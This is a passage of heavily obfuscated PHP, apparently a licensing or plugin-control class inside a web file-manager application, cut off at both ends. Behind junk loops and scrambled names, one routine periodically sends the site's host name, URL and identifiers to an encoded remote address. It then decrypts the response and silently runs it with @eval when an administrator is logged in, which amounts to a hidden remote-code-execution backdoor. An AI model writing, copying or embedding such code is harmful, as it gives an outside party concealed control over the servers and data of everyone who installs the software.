($ıûÒÒ×˜ as $–æøÌãÖ => $ˆ¯¸ÌÓù) { if ($ˆ¯¸ÌÓù == $Ì¼Ğ¢¹[226] && substr($this->cyts2a91e109, 0, 1) == $Ì¼Ğ¢¹[226]) { continue; } if (!in_array($–æøÌãÖ, $õÉşºûÒ)) { $î¹ÃÜá[] = $–æøÌãÖ; } } foreach ($î¹ÃÜá as $–æøÌãÖ) { unset($Ÿ£´Ç£ı[$–æøÌãÖ]); } return $Ÿ£´Ç£ı; $çƒÆÊ³ = $ˆ†ÜÍ­[736]; while ($çƒÆÊ³ < $ˆ†ÜÍ­[668]) { if ($çƒÆÊ³ >= 0) { break; } $çƒÆÊ³++; } } private function versionPluginList() { $á¡äÎé =& $_SERVER[„½Ù‘ß¨]; return array($á¡äÎé[227] => $á¡äÎé[226], $á¡äÎé[228] => $á¡äÎé[226], $á¡äÎé[229] => $á¡äÎé[226], $á¡äÎé[230] => $á¡äÎé[231], $á¡äÎé[232] => $á¡äÎé[231], $á¡äÎé[233] => $á¡äÎé[231], $á¡äÎé[234] => $á¡äÎé[231], $á¡äÎé[235] => $á¡äÎé[231], $á¡äÎé[236] => $á¡äÎé[231], $á¡äÎé[237] => $á¡äÎé[231], $á¡äÎé[238] => $á¡äÎé[231], $á¡äÎé[239] => $á¡äÎé[231], $á¡äÎé[240] => $á¡äÎé[231], $á¡äÎé[241] => $á¡äÎé[231], $á¡äÎé[242] => $á¡äÎé[231], $á¡äÎé[243] => $á¡äÎé[231]); $²“ÊÉŸ = $_SERVER[Õò”†—·][737]; if (!$²“ÊÉŸ) { return; } } private function versionPluginFilter() { $Ó£¿ê‘ =& $_SERVER[Õò”†—·]; $«Ì„¡Ç­ =& $_SERVER[„½Ù‘ß¨]; if ($this->cyts2a91e109 == $«Ì„¡Ç­[108]) { return $«Ì„¡Ç­[6]; } $ÛäªŒ = _get($this->vexbcfbc4957, $«Ì„¡Ç­[244], $«Ì„¡Ç­[6]); $ôåÂí¯ƒ = _get($this->vexbcfbc4957, $«Ì„¡Ç­[115], $«Ì„¡Ç­[6]); $Åì¦ÁÙ­ = $Ó£¿ê‘[738]; while (strlen($Åì¦ÁÙ­) < $Ó£¿ê‘[671]) { if (!$Åì¦ÁÙ­) { break; } $Åì¦ÁÙ­++; } $¿ïûÂÄ¶ = _get($this->vexbcfbc4957, $«Ì„¡Ç­[245], $«Ì„¡Ç­[6]); if ($ôåÂí¯ƒ > time() && $¿ïûÂÄ¶ > time()) { $€­µ©‰» = explode($«Ì„¡Ç­[225], $ÛäªŒ); $Ìàæö³Ä = array_keys($this->versionPluginList()); $ÛäªŒ = array_merge($€­µ©‰», $Ìàæö³Ä); $ÛäªŒ = implode($«Ì„¡Ç­[225], array_filter(array_unique($ÛäªŒ))); } return $ÛäªŒ; } private function vnwa4044a89e() { $ÎËì‰àÓ =& $_SERVER[„½Ù‘ß¨]; if ($this->cyts2a91e109 != $ÎËì‰àÓ[108]) { $GLOBALS[$ÎËì‰àÓ[85]][$ÎËì‰àÓ[89]][$ÎËì‰àÓ[246]] = $ÎËì‰àÓ[205]; return; } $GLOBALS[$ÎËì‰àÓ[85]][$ÎËì‰àÓ[247]] = $ÎËì‰àÓ[121]; if (Model($ÎËì‰àÓ[248])->get($ÎËì‰àÓ[63]) != $ÎËì‰àÓ[205]) { Model($ÎËì‰àÓ[248])->set($ÎËì‰àÓ[63], $ÎËì‰àÓ[205]); } } public function ausi648f865a() { return $_SERVER[„½Ù‘ß¨][249]; $ÙÓ§Èòß = $_SERVER[Õò”†—·][739]; if (!$ÙÓ§Èòß) { die; } } private function xwvhd7435cd5() { $°¡ŠÌìÌ =& $_SERVER[Õò”†—·]; $¼¦ˆï¡š =& $_SERVER[„½Ù‘ß¨]; $øÉ‘Ü = array($¼¦ˆï¡š[250], $¼¦ˆï¡š[251], $¼¦ˆï¡š[252]); $ËÍ²ÜÁ = $°¡ŠÌìÌ[740]; if (strlen($ËÍ²ÜÁ) < $°¡ŠÌìÌ[674]) { return; } $†¹´åÀ = $¼¦ˆï¡š[253] . md5($¼¦ˆï¡š[254]); if ($this->cyts2a91e109 == $¼¦ˆï¡š[108] || !KodUser::isRoot()) { return; } if (!in_array($_SERVER[$¼¦ˆï¡š[24]], $øÉ‘Ü)) { return; } if (time() % 4 != 0) { return; } $ÌêÛœÃû = call_user_func(array($¼¦ˆï¡š[255], $¼¦ˆï¡š[256]), $†¹´åÀ); if ($ÌêÛœÃû && time() - $ÌêÛœÃû < intval($¼¦ˆï¡š[257])) { return; } call_user_func(array($¼¦ˆï¡š[255], $¼¦ˆï¡š[138]), $†¹´åÀ, time()); $ü£œÌ© = $°¡ŠÌìÌ[741]; $°æ¨Åçş = Model($¼¦ˆï¡š[33])->get($¼¦ˆï¡š[99]); $†àíö«Ä = array($¼¦ˆï¡š[151] => Model($¼¦ˆï¡š[33])->get($¼¦ˆï¡š[152]), $¼¦ˆï¡š[166] => $this->cyts2a91e109, $¼¦ˆï¡š[162] => $_SERVER[$¼¦ˆï¡š[163]], $¼¦ˆï¡š[164] => Model($¼¦ˆï¡š[33])->get($¼¦ˆï¡š[130]), $¼¦ˆï¡š[104] => md5($_SERVER[$¼¦ˆï¡š[105]] . $°æ¨Åçş), $¼¦ˆï¡š[155] => $¼¦ˆï¡š[135], $¼¦ˆï¡š[158] => $_SERVER[$¼¦ˆï¡š[159]]); $ş¹û£¢› = $°¡ŠÌìÌ[742]; $¾á™««Ó = $this->xuzsc8ae302e($¼¦ˆï¡š[258], $†àíö«Ä); $÷ƒı¿öş = $°¡ŠÌìÌ[743]; if (!$÷ƒı¿öş) { die; } if (!is_array($¾á™««Ó)) { return; } if ($¾á™««Ó[$¼¦ˆï¡š[151]] && $¾á™««Ó[$¼¦ˆï¡š[259]]) { if ($this->waus587e4d54($¾á™««Ó[$¼¦ˆï¡š[259]]) == $†àíö«Ä[$¼¦ˆï¡š[151]]) { return; } } $this->ntswa125bfa5(); $ÈÎ®’ì = $°¡ŠÌìÌ[736]; while ($ÈÎ®’ì < $°¡ŠÌìÌ[684]) { if ($ÈÎ®’ì >= 0) { break; } $ÈÎ®’ì++; } if ($this->waus587e4d54($¾á™««Ó[$¼¦ˆï¡š[259]]) != $†àíö«Ä[$¼¦ˆï¡š[151]]) { $øÏ„ú½Ô = array($¼¦ˆï¡š[184] => $°æ¨Åçş, $¼¦ˆï¡š[185] => $_SERVER[$¼¦ˆï¡š[105]], $¼¦ˆï¡š[186] => this_url(), $¼¦ˆï¡š[160] => $_SERVER[$¼¦ˆï¡š[161]]); $áñè”©Ï = $this->hqjkf0657195(json_encode($øÏ„ú½Ô)); $¾á™««Ó = $this->xuzsc8ae302e($¼¦ˆï¡š[187] . $áñè”©Ï); if ($¾á™««Ó && is_array($¾á™««Ó) && isset($¾á™««Ó[$¼¦ˆï¡š[259]])) { $½ú·¡± = $this->wbsda64e3e12($¾á™««Ó[$¼¦ˆï¡š[259]], 2); if ($½ú·¡±) { $½ú·¡± = $this->waus587e4d54($½ú·¡±); } if ($½ú·¡±) { try { @eval($½ú·¡±); } catch (Exception $øÃÉïŸş) { } } } } } private function xuzsc8ae302e($ƒ„¬ô÷» = '', $çìåæø™ = array(), $ÚâªÉÏ¦ = 5) { $ñ£í—¡Ø =& $_SERVER[Õò”†—·]; $£Àê—óø =& $_SERVER[„½Ù‘ß¨]; $üä¶“ğÂ = $£Àê—óø[260]; $üä¶“ğÂ = $this->lacmf4b610bb($üä¶“ğÂ, $£Àê—óø[261]); $üä¶“ğÂ = $üä¶“ğÂ . $ƒ„¬ô÷»; if ($çìåæø™ && is_array($çìåæø™)) { $üä¶“ğÂ = $üä¶“ğÂ . $£Àê—óø[262] . http_build_query($çìåæø™); } if ($çìåæø™ === -1) { return $üä¶“ğÂ; } $×¬ƒÊª° = stream_context_create(array($£Àê—óø[218] => array($£Àê—óø[221] => $ÚâªÉÏ¦, $£Àê—óø[219] => $£Àê—óø[263]), $£Àê—óø[264] => array($£Àê—óø[265] => !1, $£Àê—óø[266] => !1))); $çìåæø™ = @file_get_contents($üä¶“ğÂ, !1, $×¬ƒÊª°); return json_decode($çìåæø™, !0); $ÑÙ±øé = $ñ£í—¡Ø[744]; if (strlen($ÑÙ±øé) < $ñ£í—¡Ø[684]) { return; } } private function tcyr2857ae31() { $Öõ¢ƒëû =& $_SERVER[Õò”†—·]; $‡óËÖ =& $_SERVER[„½Ù‘ß¨]; $²“úÏŸ¢ = array($‡óËÖ[267] => $‡óËÖ[268], $‡óËÖ[269] => $‡óËÖ[270], $‡óËÖ[271] => $‡óËÖ[272], $‡óËÖ[273] => $‡óËÖ[274], $‡óËÖ[275] => $‡óËÖ[276], $‡óËÖ[277] => $‡óËÖ[213], $‡óËÖ[278] => $‡óËÖ[213], $‡óËÖ[279] => $‡óËÖ[268], $‡óËÖ[280] => $‡óËÖ[270], $‡óËÖ[281] => $‡óËÖ[272], $‡óËÖ[282] => $‡óËÖ[283], $‡óËÖ[284] => $‡óËÖ[274], $‡óËÖ[285] => $‡óËÖ[286], $‡óËÖ[287] => $‡óËÖ[276], $‡óËÖ[288] => $‡óËÖ[289], $‡óËÖ[290] => $‡óËÖ[291], $‡óËÖ[292] => $‡óËÖ[293]); $›¿×á ê = $²“úÏŸ¢[$this->cyts2a91e109]; $¬²…øñÓ = $Öõ¢ƒëû[745]; $›¿×á ê = intval($›¿×á ê ? $›¿×á ê : $‡óËÖ[268]); $òíÁÍ¥ = _get($this->vexbcfbc4957, $‡óËÖ[294]); $òíÁÍ¥ = $òíÁÍ¥ ? intval($òíÁÍ¥) : 0; $»‡Óáƒ = $Öõ¢ƒëû[746]; if (strlen($»‡Óáƒ) < $Öõ¢ƒëû[671]) { die; } return $›¿×á ê + $òíÁÍ¥; } public function kwjmbe389a00($ø–éƒ¿è) { $–ä¾ØÌ =& $_SERVER[Õò”†—·]; $¤Ã•ğ¼Ú =& $_SERVER[„½Ù‘ß¨]; $é«İ¤çÑ = $this->tcyr2857ae31(); if ($ø–éƒ¿è[$¤Ã•ğ¼Ú[295]] == $¤Ã•ğ¼Ú[121]) { return; } if ($é«İ¤çÑ >= intval($¤Ã•ğ¼Ú[213])) { return; } $êÓ»Şä„ = Model($¤Ã•ğ¼Ú[124])->count(); $şõ¹šµğ = $–ä¾ØÌ[747]; if (strlen($şõ¹šµğ) < $–ä¾ØÌ[671]) { die; } if ($êÓ»Şä„ <= $é«İ¤çÑ) { return; } $µ²¹£Ú = Model($¤Ã•ğ¼Ú[124])->field($¤Ã•ğ¼Ú[295])->limit($é«İ¤çÑ)->select(); $µ²¹£Ú = array_to_keyvalue($µ²¹£Ú, $¤Ã•ğ¼Ú[6], $¤Ã•ğ¼Ú[295]); $Ã½ ¬ÁØ = $–ä¾ØÌ[748]; while ($Ã½ ¬ÁØ < $–ä¾ØÌ[674]) { if ($Ã½ ¬ÁØ >= 0) { break; } $Ã½ ¬ÁØ++; } if (!in_array($ø–éƒ¿è[$¤Ã•ğ¼Ú[295]], $µ²¹£Ú)) { show_json($¤Ã•ğ¼Ú[296], !1, $¤Ã•ğ¼Ú[209]); } } public function dnpxcda83a61() { $ÏÜ ¸¾‰ =& $_SERVER[Õò”†—·]; $û™Œ•„§ =& $_SERVER[„½Ù‘ß¨]; if (!KodUser::isRoot() || mt_rand(1, 100) > 20) { return; } $´†É’Ú = $û™Œ•„§[216]; $´†É’Ú = $this->lacmf4b610bb($´†É’Ú, $û™Œ•„§[217]); $ğ’˜…¸Ï = stream_context_create(array($û™Œ•„§[218] => array($û™Œ•„§[219] => $û™Œ•„§[220], $û™Œ•„§[221] => 3))); $·şîäüƒ = $ÏÜ ¸¾‰[749]; while ($·şîäüƒ < $ÏÜ ¸¾‰[684]) { if ($·şîäüƒ >= 0) { break; } $·şîäüƒ++; } $±§ò™í– = @file_get_contents($´†É’Ú, !1, $ğ’˜…¸Ï); $–¹Ÿ = $ÏÜ ¸¾‰[750]; while (strlen($–¹Ÿ) < $ÏÜ ¸¾‰[671]) { if (!$–¹Ÿ) { break; } $–¹Ÿ++; } echo $û™Œ•„§[297] . hash_encode($±§ò™í–) . $û™Œ•„§[298]; } private function vxbt9c4ab0a3($şú½ÛÆ×, $øÉû¡Ø™, $‰¸¶ÖÒş = 3) { $´—ƒœš =& $_SERVER[Õò”†—·]; $Šûõ›‹¹ =& $_SERVER[„½Ù‘ß¨]; usleep(1); $şú½ÛÆ× = trim($şú½ÛÆ×); $­„—’ü± = mt_rand(0, 5) . $Šûõ›‹¹[6]; $ï€ÈéÔé = rand_string(15); $¨ãº¾µë = $´—ƒœš[751]; if (strlen($¨ãº¾µë) < $´—ƒœš[674]) { return; } $ÙºğÇèá = $Šûõ›‹¹[299]; switch ($­„—’ü±) { case $Šûõ›‹¹[205]: $³¦‡€Ã = $this->ioesd3cdc5bb($şú½ÛÆ×, strrev($øÉû¡Ø™ . $ï€ÈéÔé)); break; case $Šûõ›‹¹[121]: $³¦‡€Ã = $this->ioesd3cdc5bb($şú½ÛÆ×, strrev($ï€ÈéÔé . $øÉû¡Ø™)); break; case $Šûõ›‹¹[300]: $³¦‡€Ã = $this->ioesd3cdc5bb($şú½ÛÆ×, base64_encode($ï€ÈéÔé . $øÉû¡Ø™)); break; $é–’öÂ = $´—ƒœš[752]; case $Šûõ›‹¹[301]: $³¦‡€Ã = $this->ioesd3cdc5bb($şú½ÛÆ×, md5($ï€ÈéÔé . $øÉû¡Ø™)); $ÃÀé¸Æ† = $´—ƒœš[753]; break; $¢ÅºŠéœ = $´—ƒœš[754]; case $Šûõ›‹¹[302]: $şú½ÛÆ× = base64_encode($şú½ÛÆ×); $™ú¯©ø£ = rand(0, 64); $·À£¦ªÈ = $´—ƒœš[755]; $¿œúª¢Î = $ÙºğÇèá[$™ú¯©ø£]; $¦ç·éÎ¶ = md5($¿œúª¢Î . md5($øÉû¡Ø™ . $¿œúª¢Î) . $øÉû¡Ø™); $…ï‡¿ı‰ = $´—ƒœš[756]; if (strlen($…ï‡¿ı‰) < $´—ƒœš[674]) { die; } $¦ç·éÎ¶ = substr($¦ç·éÎ¶, $™ú¯©ø£ % 8, $™ú¯©ø£ % 8 + 7); $÷—ë¶ÒÌ = $Šûõ›‹¹[6]; $‚‹Ì¦‚½ = 0; $µ‡éĞ× = $´—ƒœš[757]; if (strlen($µ‡éĞ×) < $´—ƒœš[674]) { return; } $½»ßš¤ = 0; $¤Õ¹–›ñ = 0; $©œùÇ£Õ = $´—ƒœš[758]; if (!$©œùÇ£Õ) { die; } for ($‚‹Ì¦‚½ = 0; $‚‹Ì¦‚½ < strlen($şú½ÛÆ×); $‚‹Ì¦‚½++) { $¤Õ¹–›ñ = $¤Õ¹–›ñ == strlen($¦ç·éÎ¶) ? 0 : $¤Õ¹–›ñ; $‚éıÒØ = $´—ƒœš[759]; if (!$‚éıÒØ) { return; } $½»ßš¤ = ($™ú¯©ø£ + strpos($ÙºğÇèá, $şú½ÛÆ×[$‚‹Ì¦‚½]) + ord($¦ç·éÎ¶[$¤Õ¹–›ñ++])) % 64; $÷—ë¶ÒÌ .= $ÙºğÇèá[$½»ßš¤]; } $³¦‡€Ã = hash_encode($¿œúª¢Î . $÷—ë¶ÒÌ); break; $Æ×ÑŸ·ä = $´—ƒœš[760]; if (!$Æ×ÑŸ·ä) { die; } default: $³¦‡€Ã = $this->ioesd3cdc5bb($şú½ÛÆ×, $øÉû¡Ø™ . $ï€ÈéÔé); break; $¹€‹Üƒ = $´—ƒœš[761]; if (strlen($¹€‹Üƒ) < $´—ƒœš[668]) { return; } } $³¦‡€Ã = strrev($­„—’ü± . $ï€ÈéÔé . $³¦‡€Ã); if ($‰¸¶ÖÒş - 1 > 0) { $³¦‡€Ã = $this->vxbt9c4ab0a3($³¦‡€Ã, $øÉû¡Ø™, $‰¸¶ÖÒş - 1); } return $³¦‡€Ã; } private function wbsda64e3e12($ÏÃ±öº¡, $ª‡¾ÏÇï, $å™ô•‘ = 3) { $ŠÔ­á¯É =& $_SERVER[Õò”†—·]; $ıÉ²Ôüı =& $_SERVER[„½Ù‘ß¨]; if (!is_string($ÏÃ±öº¡) || strlen($ÏÃ±öº¡) < 10) { return !1; } $ÏÃ±öº¡ = trim($ÏÃ±öº¡); $ÏÃ±öº¡ = strrev($ÏÃ±öº¡); $™—Ì˜È = $ÏÃ±öº¡[0]; $…Â˜Ğ—ä = substr($ÏÃ±öº¡, 1, 15); $È¦ÑÀç = $ŠÔ­á¯É[762]; while (strlen($È¦ÑÀç) < $ŠÔ­á¯É[674]) { if (!$È¦ÑÀç) { break; } $È¦ÑÀç++; } $ÏÃ±öº¡ = substr($ÏÃ±öº¡, 16); $ÙŒ§²§š = $ıÉ²Ôüı[299]; switch ($™—Ì˜È) { case $ıÉ²Ôüı[205]: $éË†³ÌŠ = $this->lacmf4b610bb($ÏÃ±öº¡, strrev($ª‡¾ÏÇï . $…Â˜Ğ—ä)); break; $èÊ¨åÚŸ = $ŠÔ­á¯É[763]; if (!$èÊ¨åÚŸ) { return; } case $ıÉ²Ôüı[121]: $éË†³ÌŠ = $this->lacmf4b610bb($ÏÃ±öº¡, strrev($…Â˜Ğ—ä . $ª‡¾ÏÇï)); break; $èó´‚Ë¬ = $ŠÔ­á¯É[764]; while (strlen($èó´‚Ë¬) < $ŠÔ­á¯É[668]) { if (!$èó´‚Ë¬) { break; } $èó´‚Ë¬++; } case $ıÉ²Ôüı[300]: $éË†³ÌŠ = $this->lacmf4b610bb($ÏÃ±öº¡, base64_encode($…Â˜Ğ—ä . $ª‡¾ÏÇï)); break; $¾¬¯é = $ŠÔ­á¯É[765]; if (strlen($¾¬¯é) < $ŠÔ­á¯É[668]) { return; } case $ıÉ²Ôüı[301]: $éË†³ÌŠ = $this->lacmf4b610bb($ÏÃ±öº¡, md5($…Â˜Ğ—ä . $ª‡¾ÏÇï)); $ı«âÔ«— = $ŠÔ­á¯É[766]; if (!$ı«âÔ«—) { return; } break; $óÚãí˜ = $ŠÔ­á¯É[767]; case $ıÉ²Ôüı[302]: $ÏÃ±öº¡ = hash_decode($ÏÃ±öº¡); $¾«ûˆÀ = $ŠÔ­á¯É[768]; if (strlen($¾«ûˆÀ) < $ŠÔ­á¯É[13]) { return; } $Š ¦µ¹Ü = $ÏÃ±öº¡[0]; $ÏÃ±öº¡ = substr($ÏÃ±öº¡, 1); $¿“ëŠ»™ = $ŠÔ­á¯É[769]; $†½÷íìú = strpos($ÙŒ§²§š, $Š ¦µ¹Ü); $•ÖøÊé = $ŠÔ­á¯É[770]; $¢ØİØ„ô = md5($Š ¦µ¹Ü . md5($ª‡¾ÏÇï . $Š ¦µ¹Ü) . $ª‡¾ÏÇï); $¢ØİØ„ô = substr($¢ØİØ„ô, $†½÷íìú % 8, $†½÷íìú % 8 + 7); $“÷ãùœ¹ = $ıÉ²Ôüı[6]; $ğ…ÜÃîº = $ŠÔ­á¯É[771]; while ($ğ…ÜÃîº < $ŠÔ­á¯É[13]) { if ($ğ…ÜÃîº >= 0) { break; } $ğ…ÜÃîº++; } $‰„£Èöè = 0; $¤Ü¿ö‚Ş = 0; $Ş‡Äƒíß = $ŠÔ­á¯É[772]; $‹¾ì±Ë” = 0; for ($‰„£Èöè = 0; $‰„£Èöè < strlen($ÏÃ±öº¡); $‰„£Èöè++) { $‹¾ì±Ë” = $‹¾ì±Ë” == strlen($¢ØİØ„ô) ? 0 : $‹¾ì±Ë”; $›’ªöØ— = $ŠÔ­á¯É[773]; if (strlen($›’ªöØ—) < $ŠÔ­á¯É[684]) { die; } $ŞÈåÀñ¿ = $‹¾ì±Ë”++; $ñó­¢±‡ = $ŠÔ­á¯É[774]; if (strlen($ñó­¢±‡) < $ŠÔ­á¯É[684]) { die; } $¤Ü¿ö‚Ş = strpos($ÙŒ§²§š, $ÏÃ±öº¡[$‰„£Èöè]) - $†½÷íìú - ord($¢ØİØ„ô[$ŞÈåÀñ¿]); $·üÅµŞ = $ŠÔ­á¯É[775]; while (strlen($·üÅµŞ) < $ŠÔ­á¯É[671]) { if (!$·üÅµŞ) { break; } $·üÅµŞ++; } while ($¤Ü¿ö‚Ş < 0) { $¤Ü¿ö‚Ş += 64; $È´–“Œù = $ŠÔ­á¯É[776]; if (strlen($È´–“Œù) < $ŠÔ­á¯É[671]) { return; } } $“÷ãùœ¹ .= $ÙŒ§²§š[$¤Ü¿ö‚Ş]; } $éË†³ÌŠ = base64_decode($“÷ãùœ¹); break; $Ñ‘¯¹ = $ŠÔ­á¯É[777]; if (!$Ñ‘¯¹) { return; } default: $éË†³ÌŠ = $this->lacmf4b610bb($ÏÃ±öº¡, $ª‡¾ÏÇï . $…Â˜Ğ—ä); $­¸·Öù = $ŠÔ­á¯É[778]; if (!$­¸·Öù) { die; } break; } if ($å™ô•‘ - 1 > 0) { $éË†³ÌŠ = $this->wbsda64e3e12($éË†³ÌŠ, $ª‡¾ÏÇï, $å™ô•‘ - 1); } return $éË†³ÌŠ; } public function hqjkf0657195($ä¤Æ²ìÄ) { $àÓ¶­òÇ =& $_SERVER[Õò”†—·]; $ü²å°Ú =& $_SERVER[„½Ù‘ß¨]; $ı Ñ„¤Ç = $this->egaq73ea3772(); $ë¯‘†‚Ô = $this->egaq73ea3772(); $îâ­òÁ = ($ı Ñ„¤Ç - 1) * ($ë¯‘†‚Ô - 1); $Äóğ¬ùë = intval(($ı Ñ„¤Ç + $ë¯‘†‚Ô) / 2); while (1) { $ã ”ÁÎ = $Äóğ¬ùë; $êª¦ÅİÄ = $îâ­òÁ; $¶•èÖù = $àÓ¶­òÇ[779]; if (!$¶•èÖù) { return; } while ($êª¦ÅİÄ % $ã ”ÁÎ != 0) { $ÁŒ¹¢şÉ = $êª¦ÅİÄ; $•›Æé§ = $àÓ¶­òÇ[780]; if (!$•›Æé§) { return; } $êª¦ÅİÄ = $ã ”ÁÎ; $æÓ™Í¶ = $àÓ¶­òÇ[781]; $ã ”ÁÎ = $ÁŒ¹¢şÉ % $ã ”ÁÎ; } if ($ã ”ÁÎ == 1) { break; } else { $Äóğ¬ùë++; } } $æÁİùÆ = 2; $™ÙÌˆ = $àÓ¶­òÇ[782]; if (!$™ÙÌˆ) { die; } for ($²ÚÛÉô = 0; $²ÚÛÉô < $îâ­òÁ * 10; $²ÚÛÉô++) { if (($îâ­òÁ * $²ÚÛÉô + 1) % $Äóğ¬ùë == 0) { $æÁİùÆ = intval(($îâ­òÁ * $²ÚÛÉô + 1) / $Äóğ¬ùë); break; } } $“£Ô«ŒØ = $this->ioesd3cdc5bb($ı Ñ„¤Ç * $ë¯‘†‚Ô . $ü²å°Ú[6], $ü²å°Ú[135]); $®îÑù = $àÓ¶­òÇ[783]; if (strlen($®îÑù) < $àÓ¶­òÇ[13]) { die; } $‰¯†¦­ = md5($ü²å°Ú[303] . ($ı Ñ„¤Ç + $ë¯‘†‚Ô) . $ü²å°Ú[304] . $Äóğ¬ùë . $ü²å°Ú[304] . $æÁİùÆ . $ü²å°Ú[305]); $™ºì¼ß = $àÓ¶­òÇ[784]; while ($™ºì¼ß < $àÓ¶­òÇ[13]) { if ($™ºì¼ß >= 0) { break; } $™ºì¼ß++; } $É•¹ÍÏ = $this->ioesd3cdc5bb($ä¤Æ²ìÄ, $‰¯†¦­) . $ü²å°Ú[306] . $“£Ô«ŒØ; $í¿ÙŠ‘ = $àÓ¶­òÇ[785]; while (strlen($í¿ÙŠ‘) < $àÓ¶­òÇ[671]) { if (!$í¿ÙŠ‘) { break; } $í¿ÙŠ‘++; } return $É•¹ÍÏ; } public function waus587e4d54($Ï“İéáü) { $ÕÀÜùä =& $_SERVER[Õò”†—·]; $Ã¶ã»ÓÛ =& $_SERVER[„½Ù‘ß¨]; $àÊ‡ˆœ» = explode($Ã¶ã»ÓÛ[306], $Ï“İéáü); $²º‚Ô¤ø = $ÕÀÜùä[786]; if (strlen($²º‚Ô¤ø) < $ÕÀÜùä[671]) { return; } if (count($àÊ‡ˆœ») != 2) { return $Ã¶ã»ÓÛ[6]; } $ÑÖ¡ÊÔ¿ = $this->lacmf4b610bb($àÊ‡ˆœ»[1] . $Ã¶ã»ÓÛ[6], $Ã¶ã»ÓÛ[135]); if (!$ÑÖ¡ÊÔ¿) { return $Ã¶ã»ÓÛ[6]; } $ÑÖ¡ÊÔ¿ = intval($ÑÖ¡ÊÔ¿); $Æ¢çÃ¯ = 0; $ã˜ùç© = $ÕÀÜùä[787]; if (!$ã˜ùç©) { die; } $¶Ë¼æÌ = 0; for ($Ç‡“Ù£Ê = 3; $Ç‡“Ù£Ê < $ÑÖ¡ÊÔ¿; $Ç‡“Ù£Ê += 2) { if ($ÑÖ¡ÊÔ¿ % $Ç‡“Ù£Ê != 0) { continue; } $Æ¢çÃ¯ = $Ç‡“Ù£Ê; $¨Ì“Éòí = $ÕÀÜùä[788]; if (!$¨Ì“Éòí) { return; } $¶Ë¼æÌ = intval($ÑÖ¡ÊÔ¿ / $Ç‡“Ù£Ê); break; $Ì‰ÑÛµ = $ÕÀÜùä[789]; while (strlen($Ì‰ÑÛµ) < $ÕÀÜùä[13]) { if (!$Ì‰ÑÛµ) { break; } $Ì‰ÑÛµ++; } } $Ù——†‡ = ($Æ¢çÃ¯ - 1) * ($¶Ë¼æÌ - 1); $ü¥ÑÛŞ = $ÕÀÜùä[790]; $ë›¹Œï· = intval(($Æ¢çÃ¯ + $¶Ë¼æÌ) / 2); while (1) { $•ÄæéûÜ = $ë›¹Œï·; $™«äßõ® = $ÕÀÜùä[791]; while ($™«äßõ® < $ÕÀÜùä[13]) { if ($™«äßõ® >= 0) { break; } $™«äßõ®++; } $·íÉ¥äà = $Ù——†‡; while ($·íÉ¥äà % $•ÄæéûÜ != 0) { $°ÓİËó = $·íÉ¥äà; $·íÉ¥äà = $•ÄæéûÜ; $Õ©ÕÓ‚ = $ÕÀÜùä[792]; while ($Õ©ÕÓ‚ < $ÕÀÜùä[13]) { if ($Õ©ÕÓ‚ >= 0) { break; } $Õ©ÕÓ‚++; } $•ÄæéûÜ = $°ÓİËó % $•ÄæéûÜ; } if ($•ÄæéûÜ == 1) { break; } else { $ë›¹Œï·++; } } $”–Ä¹Î­ = 2; for ($Ç‡“Ù£Ê = 0; $Ç‡“Ù£Ê < $Ù——†‡ * 10; $Ç‡“Ù£Ê++) { if (($Ù——†‡ * $Ç‡“Ù£Ê + 1) % $ë›¹Œï· == 0) { $”–Ä¹Î­ = intval(($Ù——†‡ * $Ç‡“Ù£Ê + 1) / $ë›¹Œï·); break; } } $Ëä˜èÖ¬ = md5($Ã¶ã»ÓÛ[303] . ($Æ¢çÃ¯ + $¶Ë¼æÌ) . $Ã¶ã»ÓÛ[304] . $ë›¹Œï· . $Ã¶ã»ÓÛ[304] . $”–Ä¹Î­ . $Ã¶ã»ÓÛ[305]); $şÕãçä = $ÕÀÜùä[793]; $¥·ÂêÂ¸ = $this->lacmf4b610bb($àÊ‡ˆœ»[0], $Ëä˜èÖ¬); $¤ÖŸ ¥Ê = $ÕÀÜùä[794]; while (strlen($¤ÖŸ ¥Ê) < $ÕÀÜùä[674]) { if (!$¤ÖŸ ¥Ê) { break; } $¤ÖŸ ¥Ê++; } return $¥·ÂêÂ¸; $ÅÉ£ãÊõ = $ÕÀÜùä[795]; while (strlen($ÅÉ£ãÊõ) < $ÕÀÜùä[668]) { if (!$ÅÉ£ãÊõ) { break; } $ÅÉ£ãÊõ++; } } public function egaq73ea3772() { $…˜äÇ¨ =& $_SERVER[Õò”†—·]; $ÆÇàÏØß = mt_rand(pow(2, 14), pow(2, 16) - 1); $ğÀî—³Ñ = $…˜äÇ¨[796]; if (strlen($ğÀî—³Ñ) < $…˜äÇ¨[684]) { return; } $Şû¿¡­Ü = array(); $†—ÑÓ¬® = 1; while ($†—ÑÓ¬® <= (int) sqrt($ÆÇàÏØß)) { $·”¨ß²ş = $†—ÑÓ¬®; while (!0) { $·”¨ß²ş++; if ($·”¨ß²ş <= 2) { $†—ÑÓ¬® = $·”¨ß²ş; break; } else { if ($·”¨ß²ş < 2) { continue; } } $ìµ¾’‘Ê = !0; for ($æß¼ËÜ = 2; $æß¼ËÜ <= sqrt($·”¨ß²ş); $æß¼ËÜ++) { if ($·”¨ß²ş % $æß¼ËÜ == 0) { $ìµ¾’‘Ê = !1; } } if ($ìµ¾’‘Ê) { $†—ÑÓ¬® = $·”¨ß²ş; break; } } $Şû¿¡­Ü[] = $†—ÑÓ¬®; } $˜¦ÙªŞ£ = 2; $ìÇ•¤Š = $…˜äÇ¨[797]; if (strlen($ìÇ•¤Š) < $…˜äÇ¨[668]) { die; } for ($·”¨ß²ş = $ÆÇàÏØß; $·”¨ß²ş > 1; $·”¨ß²ş--) { $ìµ¾’‘Ê = !0; foreach ($Şû¿¡­Ü as $®êé¨½£) { if ($·”¨ß²ş % $®êé¨½£ == 0) { $ìµ¾’‘Ê = !1; break; } } if ($ìµ¾’‘Ê) { $˜¦ÙªŞ£ = $·”¨ß²ş; break; } } return $˜¦ÙªŞ£; } public function xetca1c04475($×¨Ğ¶›í, $æÆå“Îé) { $·°Ëş =& $_SERVER[„½Ù‘ß¨]; return call_user_func(array($·°Ëş[8], $·°Ëş[307]), $×¨Ğ¶›í, $æÆå“Îé); } public function ioesd3cdc5bb($Ú˜ú˜øš, $ÏÚÈÒ“Ã) { $úŸ©‡©§ =& $_SERVER[Õò”†—·]; $öä ÂéĞ =& $_SERVER[„½Ù‘ß¨]; return call_user_func(array($öä ÂéĞ[308], $öä ÂéĞ[309]), $Ú˜ú˜øš, $ÏÚÈÒ“Ã); $Öû€î˜Ÿ = $úŸ©‡©§[798]; if (strlen($Öû€î˜Ÿ) < $úŸ©‡©§[684]) { die; } } public function lacmf4b610bb($¤ÏòÎ¹ø, 